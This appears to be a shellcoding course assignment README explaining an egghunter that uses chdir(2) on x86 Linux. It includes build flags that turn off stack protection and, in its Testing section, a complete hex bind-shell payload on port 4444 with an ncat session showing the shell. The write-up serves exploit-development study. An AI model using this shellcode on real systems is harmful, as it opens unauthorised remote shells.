Assignment 3
============

* Study about egghunter shellcode
* Create a working demo of the egghunter
    * Should be configurable for different payloads


Egghunter shellcode
-------------------

There are several known approaches to writing egghunter shellcode for x86 Linux
systems:

  * Using specific system calls to search for egg in process' address space.
  This method practically eliminates potential segfaults and is most reliable.
  [Skape's paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
  provides all needed details.
  * Crawling process address space without checking for errors. This method may
  be prone to to segfaults. Example can be found
  [here](http://shell-storm.org/shellcode/files/shellcode-784.php).
  * Stack-crawling egghunter. Useful when shellcode is placed in environment
  variable. Example can be found
  [here](https://github.com/mortenbp/pwniesworkshop/blob/master/private/day3/egg-hunter.asm).


`egghunter.nasm` is just a ripoff from Skape's access(2) egghunter. The only
difference is that it is not using access(2) call in order to validate process
memory address - instead chdir(2) call is used which behaves in similar manner
as it comes to process memory address validation. The side effect of using
chdir(2) is that it may succeed effectively changing current working directory
to some random location on the filesystem before final shellcode is called. 


Compilation
-----------

`compile.sh` script can be used to compile and link egghunter source file:

    ./compile.sh egghunter.asm

Script will also print shellcode and its length. Shellcode can be placed in the
file `run_shellcode.c` and then compiled with:

    gcc -fno-stack-protector -z execstack -o run_shellcode run_shellcode.c


Testing
-------

Egghunter shellcode can be easily tested by placing target shellcode in the
environment variable and running previously compiled file `run_shellcode`:

    // Target shellcode: fork+bindshell 0.0.0.0:4444
    export SC=$(printf "\x90\x50\x90\x50\x90\x50\x90\x50\x31\xdb\xf7\
    \xe3\xb0\x66\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\
    \x50\xb0\x66\x43\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\
    \x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x50\x57\x89\xe1\xcd\x80\x31\
    \xc0\x50\x50\xb0\x66\xb3\x05\x57\x89\xe1\xcd\x80\x89\xc6\xb0\x02\
    \xcd\x80\x09\xc0\x75\x29\xb0\x06\x89\xfb\xcd\x80\x89\xf3\x31\xc9\
    \xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x51\x89\xe2\x89\xe1\x68\
    \x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80\x93\
    \x40\x89\xf3\xcd\x80\xeb\xb8")

    ./run_shellcode


After a while remote shell should be accessible:

    $ ncat -nv 127.0.0.1 4444
    Ncat: Version 6.25 ( http://nmap.org/ncat )
    Ncat: Connected to 127.0.0.1:4444.
    cowsay -p moooo
     _______ 
    < moooo >
     ------- 
            \   ^__^
             \  (@@)\_______
                (__)\       )\/\
                    ||----w |
                    ||     || 


References
----------

* [Linux System Call Table](http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html)
* [Metasploit - egghunt](https://community.rapid7.com/thread/1931)
* [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)


<!---
vim: set textwidth=80 wrapmargin=2:
-->
